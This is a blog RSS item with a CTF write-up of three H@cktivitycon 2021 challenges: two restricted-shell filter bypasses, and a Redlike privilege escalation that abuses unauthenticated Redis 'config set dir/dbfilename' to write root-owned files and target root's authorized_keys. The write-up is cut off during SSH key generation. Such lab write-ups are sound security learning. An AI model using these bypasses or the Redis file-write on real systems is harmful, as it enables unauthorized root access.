<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Arbitrary-file-write on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/arbitrary-file-write/</link>
    <description>Recent content in Arbitrary-file-write on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 04 Oct 2021 02:50:12 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/arbitrary-file-write/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>H@cktivitycon 2021 - Misc</title>
      <link>https://fahmifj.github.io/hacktivitycon/hacktivitycon-2021-misc/</link>
      <pubDate>Mon, 04 Oct 2021 02:50:12 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hacktivitycon/hacktivitycon-2021-misc/</guid>
      <description>This is my late CTF writeups for H@cktivitycon 2021 miscellaneous category.</description>
      <content:encoded><![CDATA[<p>So, in mid September 2021, I participated in the H@cktivitycon 2021 CTF. The event was hosted by HackerOne and lasted for two days.</p>
<p>A bit late but in this post, I&rsquo;ll share my writeups/solutions for three Miscellaneous category challenges that I solved.</p>
<p>I signed up earlier but only played the main challenges in the last few hours, which I now regret because there were so many fantastic challenges 😅🔨</p>
<h2 id="badwords">Badwords</h2>
<fieldset>
<legend>Challenge Information</legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Misc</p>
</li>
<li>
<p><strong>Difficulty:</strong> Easy</p>
</li>
<li>
<p><strong>Description</strong>:</p>
<p>You look questionable&hellip; if you don&rsquo;t have anything good to say, don&rsquo;t say anything at all!</p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough">Walkthrough</h3>
<p>When connecting, I can assume that it’s not in a proper TTY, maybe a kind of wrapper shell. Each command I sent returned with the same message telling me that it was a bad word.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">iamf@ubuntu:~$ rlwrap nc -v challenge.ctf.games <span class="m">32559</span>
</span></span><span class="line"><span class="cl">Connection to challenge.ctf.games <span class="m">32559</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>-1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">user@host:/home/user$ ls -l
</span></span><span class="line"><span class="cl">ls -l
</span></span><span class="line"><span class="cl">You said a bad word, <span class="s2">&#34;l&#34;</span>!!
</span></span><span class="line"><span class="cl">user@host:/home/user$ <span class="nb">echo</span> <span class="nv">$0</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$0</span>
</span></span><span class="line"><span class="cl">You said a bad word, <span class="s2">&#34;echo&#34;</span>!!
</span></span></code></pre></div><p>But if I send a command separator, it returns a syntax error (notice the <code>;'</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@host:/home/user$ <span class="p">;</span>ls
</span></span><span class="line"><span class="cl"><span class="p">;</span>ls
</span></span><span class="line"><span class="cl">bash: syntax error near unexpected token <span class="sb">`</span><span class="p">;</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">user@host:/home/user$
</span></span></code></pre></div><p>If I send a command enclosed with a single quote, I get the expected results. And if I supply an argument, it returns a different error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;whoami&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;whoami&#39;</span>
</span></span><span class="line"><span class="cl">user
</span></span><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;ls -l&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ls -l&#39;</span>
</span></span><span class="line"><span class="cl">bash: ls -l: <span class="nb">command</span> not found
</span></span></code></pre></div><p>So I try to separate the argument, and it works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 just
</span></span></code></pre></div><p>Now I can just do a recursive <code>ls</code> to find the flag and read it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
</span></span><span class="line"><span class="cl">just:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 out
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">just/out:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 of
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">just/out/of:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 reach
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">just/out/of/reach:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> user user <span class="m">38</span> Sep  <span class="m">9</span> 19:47 flag.txt
</span></span><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span class="o">}</span>user@host:/home/user$
</span></span></code></pre></div><h2 id="shelle">Shelle</h2>
<fieldset>
<legend>Challenge Information </legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Misc</p>
</li>
<li>
<p><strong>Difficulty:</strong>  Easy</p>
</li>
<li>
<p><strong>Description:</strong>
Professor Shelle created a custom psuedo shell for us to learn Linux,  she believes it&rsquo;s safe and no one can ever read the flag. Can you prove  her wrong?*</p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough-1">Walkthrough</h3>
<p>This challenge is another shell wrapper like badwords. Upon connected, I was provided with the following menu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">iamf@ubuntu:~$ rlwrap nc challenge.ctf.games <span class="m">32217</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to Shelle, a custom psuedo shell utility created by Professor Shelle in order to teach students about Linux terminals
</span></span><span class="line"><span class="cl">Shelle is a restricted environment to prevent any misuse, Please Enter <span class="s1">&#39;HELP&#39;</span> to know about available features, happy learning !
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@pshelle$ HELP
</span></span><span class="line"><span class="cl">HELP
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Here is the list of <span class="nb">command</span> availiable to Students
</span></span><span class="line"><span class="cl">1&gt; whoami
</span></span><span class="line"><span class="cl">2&gt; <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">3&gt; ls
</span></span><span class="line"><span class="cl">4&gt; ps
</span></span><span class="line"><span class="cl">5&gt; id
</span></span><span class="line"><span class="cl">6&gt; <span class="nb">echo</span>
</span></span><span class="line"><span class="cl">7&gt; cat
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@shelle$ 
</span></span></code></pre></div><p>When I use the <code>ls</code> command, I didn&rsquo;t find any flag in the current working directory. It seems I have to find it somewhere in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@shelle$ ls
</span></span><span class="line"><span class="cl">ls
</span></span><span class="line"><span class="cl">assignment.txt  bin
</span></span></code></pre></div><p>The first thing I tried was to list the root directory with <code>ls -l /</code>, but it turned out that some characters, including <code>/</code>, are flagged as illegal. Luckily, these chars are not,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ ( ) &#34; \
</span></span></code></pre></div><p>So, I can use the <code>echo</code> command with <code>-e</code> option within a subshell to print <code>\x2f</code> which is a hex form of <code>/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
</span></span><span class="line"><span class="cl">boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
</span></span></code></pre></div><p>After wandering around, I found the flag on <code>/opt/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
</span></span><span class="line"><span class="cl">ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
</span></span><span class="line"><span class="cl">total <span class="m">24</span>
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> shelle shelle <span class="m">17312</span> Sep  <span class="m">9</span> 19:33 binary
</span></span><span class="line"><span class="cl">-r--r--r-- <span class="m">1</span> root   root      <span class="m">38</span> Sep  <span class="m">9</span> 19:33 flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@shelle$ cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>82ad133488ad326eaf2120e03253e5d7<span class="o">}</span>
</span></span></code></pre></div><blockquote>
<p><strong>Note</strong>: I added a space after the shell prompt for readability and syntax highlighting.</p>
</blockquote>
<h2 id="redlike">Redlike</h2>
<fieldset>
<legend>Challenge Information </legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Misc</p>
</li>
<li>
<p><strong>Difficulty:</strong>  Medium</p>
</li>
<li>
<p><strong>Description:</strong></p>
<p>You know, I like the color red. Primary colors are the best colors &ndash; you can do so much with them!</p>
<p><em>Escalate your privileges and retrieve the flag out of <code>root</code>&rsquo;s home directory.</em></p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough-2">Walkthrough</h3>
<p>For this challenge, there was a set of credentials given for SSH login into a VM instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">iamf@ubuntu:~$ ssh -p <span class="m">31464</span> user@challenge.ctf.games
</span></span><span class="line"><span class="cl">user@challenge.ctf.games<span class="s1">&#39;s password:
</span></span></span><span class="line"><span class="cl"><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Documentation:  https://help.ubuntu.com
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Management:     https://landscape.canonical.com
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Support:        https://ubuntu.com/advantage
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">This system has been minimized by removing packages and content that are
</span></span></span><span class="line"><span class="cl"><span class="s1">not required on a system that users do not log into.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Ubuntu system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span class="line"><span class="cl">applicable law.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
</span></span></code></pre></div><p>At the root directory, I found <code>.docker-entrypoint</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -lah
</span></span><span class="line"><span class="cl">total 72K
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x    <span class="m">1</span> root root   <span class="m">61</span> Sep <span class="m">16</span> 14:43 .docker-entrypoint
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 bin -&gt; usr/bin
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Apr <span class="m">15</span>  <span class="m">2020</span> boot
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">5</span> root root  <span class="m">360</span> Sep <span class="m">18</span> 11:34 dev
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 etc
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:43 home
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 lib -&gt; usr/lib
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib32 -&gt; usr/lib32
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib64 -&gt; usr/lib64
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root   <span class="m">10</span> Aug <span class="m">27</span> 07:16 libx32 -&gt; usr/libx32
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 media
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 mnt
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 opt
</span></span><span class="line"><span class="cl">dr-xr-xr-x <span class="m">2595</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:34 proc
</span></span><span class="line"><span class="cl">drwx------    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 root
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 run
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">8</span> Aug <span class="m">27</span> 07:16 sbin -&gt; usr/sbin
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 srv
</span></span><span class="line"><span class="cl">dr-xr-xr-x   <span class="m">12</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:33 sys
</span></span><span class="line"><span class="cl">drwxrwxrwt    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 tmp
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:16 usr
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:27 var
</span></span></code></pre></div><p>Based on the contents of the file and the name of the challenge, it&rsquo;s clear that the privesc has something to do with Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ cat .docker-entrypoint
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/etc/init.d/redis-server start
</span></span><span class="line"><span class="cl">/usr/sbin/sshd -D
</span></span></code></pre></div><p>I can connect to the Redis server using <code>redis-cli</code> without authentication. I started the enumeration by sending <code>INFO</code> command, but under <code># Keyspace</code>, I found no active database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ which redis-cli
</span></span><span class="line"><span class="cl">/usr/bin/redis-cli
</span></span><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ redis-cli
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; INFO
</span></span><span class="line"><span class="cl"><span class="c1"># Server</span>
</span></span><span class="line"><span class="cl">redis_version:5.0.7
</span></span><span class="line"><span class="cl">redis_git_sha1:00000000
</span></span><span class="line"><span class="cl">redis_git_dirty:0
</span></span><span class="line"><span class="cl">redis_build_id:636cde3b5c7a3923
</span></span><span class="line"><span class="cl">redis_mode:standalone
</span></span><span class="line"><span class="cl">os:Linux 5.4.120+ x86_64
</span></span><span class="line"><span class="cl">arch_bits:64
</span></span><span class="line"><span class="cl">multiplexing_api:epoll
</span></span><span class="line"><span class="cl">atomicvar_api:atomic-builtin
</span></span><span class="line"><span class="cl">gcc_version:9.2.1
</span></span><span class="line"><span class="cl">process_id:15
</span></span><span class="line"><span class="cl">run_id:f5d6504f95159db85bb78e1bd786b2f3171564fd
</span></span><span class="line"><span class="cl">tcp_port:6379
</span></span><span class="line"><span class="cl">uptime_in_seconds:344
</span></span><span class="line"><span class="cl">uptime_in_days:0
</span></span><span class="line"><span class="cl">hz:10
</span></span><span class="line"><span class="cl">configured_hz:10
</span></span><span class="line"><span class="cl">lru_clock:4575234
</span></span><span class="line"><span class="cl">executable:/usr/bin/redis-server
</span></span><span class="line"><span class="cl">config_file:/etc/redis/redis.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Clients</span>
</span></span><span class="line"><span class="cl">connected_clients:1
</span></span><span class="line"><span class="cl">client_recent_max_input_buffer:2
</span></span><span class="line"><span class="cl">client_recent_max_output_buffer:0
</span></span><span class="line"><span class="cl">blocked_clients:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Memory</span>
</span></span><span class="line"><span class="cl">used_memory:859152
</span></span><span class="line"><span class="cl">used_memory_human:839.02K
</span></span><span class="line"><span class="cl">used_memory_rss:6017024
</span></span><span class="line"><span class="cl">used_memory_rss_human:5.74M
</span></span><span class="line"><span class="cl">used_memory_peak:859152
</span></span><span class="line"><span class="cl">used_memory_peak_human:839.02K
</span></span><span class="line"><span class="cl">used_memory_peak_perc:100.12%
</span></span><span class="line"><span class="cl">used_memory_overhead:845926
</span></span><span class="line"><span class="cl">used_memory_startup:796232
</span></span><span class="line"><span class="cl">used_memory_dataset:13226
</span></span><span class="line"><span class="cl">used_memory_dataset_perc:21.02%
</span></span><span class="line"><span class="cl">allocator_allocated:1575864
</span></span><span class="line"><span class="cl">allocator_active:1847296
</span></span><span class="line"><span class="cl">allocator_resident:9879552
</span></span><span class="line"><span class="cl">total_system_memory:33678073856
</span></span><span class="line"><span class="cl">total_system_memory_human:31.37G
</span></span><span class="line"><span class="cl">used_memory_lua:41984
</span></span><span class="line"><span class="cl">used_memory_lua_human:41.00K
</span></span><span class="line"><span class="cl">used_memory_scripts:0
</span></span><span class="line"><span class="cl">used_memory_scripts_human:0B
</span></span><span class="line"><span class="cl">number_of_cached_scripts:0
</span></span><span class="line"><span class="cl">maxmemory:0
</span></span><span class="line"><span class="cl">maxmemory_human:0B
</span></span><span class="line"><span class="cl">maxmemory_policy:noeviction
</span></span><span class="line"><span class="cl">allocator_frag_ratio:1.17
</span></span><span class="line"><span class="cl">allocator_frag_bytes:271432
</span></span><span class="line"><span class="cl">allocator_rss_ratio:5.35
</span></span><span class="line"><span class="cl">allocator_rss_bytes:8032256
</span></span><span class="line"><span class="cl">rss_overhead_ratio:0.61
</span></span><span class="line"><span class="cl">rss_overhead_bytes:-3862528
</span></span><span class="line"><span class="cl">mem_fragmentation_ratio:7.36
</span></span><span class="line"><span class="cl">mem_fragmentation_bytes:5199880
</span></span><span class="line"><span class="cl">mem_not_counted_for_evict:0
</span></span><span class="line"><span class="cl">mem_replication_backlog:0
</span></span><span class="line"><span class="cl">mem_clients_slaves:0
</span></span><span class="line"><span class="cl">mem_clients_normal:49694
</span></span><span class="line"><span class="cl">mem_aof_buffer:0
</span></span><span class="line"><span class="cl">mem_allocator:jemalloc-5.2.1
</span></span><span class="line"><span class="cl">active_defrag_running:0
</span></span><span class="line"><span class="cl">lazyfree_pending_objects:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Persistence</span>
</span></span><span class="line"><span class="cl">loading:0
</span></span><span class="line"><span class="cl">rdb_changes_since_last_save:0
</span></span><span class="line"><span class="cl">rdb_bgsave_in_progress:0
</span></span><span class="line"><span class="cl">rdb_last_save_time:1631964842
</span></span><span class="line"><span class="cl">rdb_last_bgsave_status:ok
</span></span><span class="line"><span class="cl">rdb_last_bgsave_time_sec:-1
</span></span><span class="line"><span class="cl">rdb_current_bgsave_time_sec:-1
</span></span><span class="line"><span class="cl">rdb_last_cow_size:0
</span></span><span class="line"><span class="cl">aof_enabled:0
</span></span><span class="line"><span class="cl">aof_rewrite_in_progress:0
</span></span><span class="line"><span class="cl">aof_rewrite_scheduled:0
</span></span><span class="line"><span class="cl">aof_last_rewrite_time_sec:-1
</span></span><span class="line"><span class="cl">aof_current_rewrite_time_sec:-1
</span></span><span class="line"><span class="cl">aof_last_bgrewrite_status:ok
</span></span><span class="line"><span class="cl">aof_last_write_status:ok
</span></span><span class="line"><span class="cl">aof_last_cow_size:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stats</span>
</span></span><span class="line"><span class="cl">total_connections_received:1
</span></span><span class="line"><span class="cl">total_commands_processed:1
</span></span><span class="line"><span class="cl">instantaneous_ops_per_sec:0
</span></span><span class="line"><span class="cl">total_net_input_bytes:31
</span></span><span class="line"><span class="cl">total_net_output_bytes:11468
</span></span><span class="line"><span class="cl">instantaneous_input_kbps:0.00
</span></span><span class="line"><span class="cl">instantaneous_output_kbps:0.00
</span></span><span class="line"><span class="cl">rejected_connections:0
</span></span><span class="line"><span class="cl">sync_full:0
</span></span><span class="line"><span class="cl">sync_partial_ok:0
</span></span><span class="line"><span class="cl">sync_partial_err:0
</span></span><span class="line"><span class="cl">expired_keys:0
</span></span><span class="line"><span class="cl">expired_stale_perc:0.00
</span></span><span class="line"><span class="cl">expired_time_cap_reached_count:0
</span></span><span class="line"><span class="cl">evicted_keys:0
</span></span><span class="line"><span class="cl">keyspace_hits:0
</span></span><span class="line"><span class="cl">keyspace_misses:0
</span></span><span class="line"><span class="cl">pubsub_channels:0
</span></span><span class="line"><span class="cl">pubsub_patterns:0
</span></span><span class="line"><span class="cl">latest_fork_usec:0
</span></span><span class="line"><span class="cl">migrate_cached_sockets:0
</span></span><span class="line"><span class="cl">slave_expires_tracked_keys:0
</span></span><span class="line"><span class="cl">active_defrag_hits:0
</span></span><span class="line"><span class="cl">active_defrag_misses:0
</span></span><span class="line"><span class="cl">active_defrag_key_hits:0
</span></span><span class="line"><span class="cl">active_defrag_key_misses:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Replication</span>
</span></span><span class="line"><span class="cl">role:master
</span></span><span class="line"><span class="cl">connected_slaves:0
</span></span><span class="line"><span class="cl">master_replid:f4b741e04432090f4eba3ef1fbdb2ce11e405aeb
</span></span><span class="line"><span class="cl">master_replid2:0000000000000000000000000000000000000000
</span></span><span class="line"><span class="cl">master_repl_offset:0
</span></span><span class="line"><span class="cl">second_repl_offset:-1
</span></span><span class="line"><span class="cl">repl_backlog_active:0
</span></span><span class="line"><span class="cl">repl_backlog_size:1048576
</span></span><span class="line"><span class="cl">repl_backlog_first_byte_offset:0
</span></span><span class="line"><span class="cl">repl_backlog_histlen:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># CPU</span>
</span></span><span class="line"><span class="cl">used_cpu_sys:0.271186
</span></span><span class="line"><span class="cl">used_cpu_user:0.278797
</span></span><span class="line"><span class="cl">used_cpu_sys_children:0.000000
</span></span><span class="line"><span class="cl">used_cpu_user_children:0.000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Cluster</span>
</span></span><span class="line"><span class="cl">cluster_enabled:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Keyspace</span>
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt;
</span></span></code></pre></div><p>The next thing I tried was writing a file to <code>/tmp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /tmp
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename choropys.php
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; <span class="nb">set</span> <span class="nb">test</span> <span class="s2">&#34;choropys&#34;</span>
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; save
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt;
</span></span></code></pre></div><p>I exited from <code>redis-cli</code> and immediately checked the file I wrote under <code>/tmp</code>. It&rsquo;s there and the owner is root!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -l /tmp/choropys.php
</span></span><span class="line"><span class="cl">-rw-rw---- <span class="m">1</span> root root <span class="m">112</span> Sep <span class="m">18</span> 11:45 /tmp/choropys.php
</span></span></code></pre></div><p>This arbitrary file write lack the execute permissions, but I remember from Hack The Box Postman that it is possible to use this to overwite the SSH <code>authorized_keys</code> file (see <a href="https://0xdf.gitlab.io/2020/03/14/htb-postman.html">this writeup</a> by 0xdf). So I can try to ovewrite the root&rsquo;s <code>authorized_keys</code> file.</p>
<p>First, I need to generate a pair of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ mkdir .ssh
</span></span><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh-keygen -t rsa
</span></span><span class="line"><span class="cl">Generating public/private rsa key pair.
</span></span><span class="line"><span class="cl">Enter file in which to save the key <span class="o">(</span>/home/user/.ssh/id_rsa<span class="o">)</span>:
</span></span><span class="line"><span class="cl">Enter passphrase <span class="o">(</span>empty <span class="k">for</span> no passphrase<span class="o">)</span>:
</span></span><span class="line"><span class="cl">Enter same passphrase again:
</span></span><span class="line"><span class="cl">Your identification has been saved in /home/user/.ssh/id_rsa
</span></span><span class="line"><span class="cl">Your public key has been saved in /home/user/.ssh/id_rsa.pub
</span></span><span class="line"><span class="cl">The key fingerprint is:
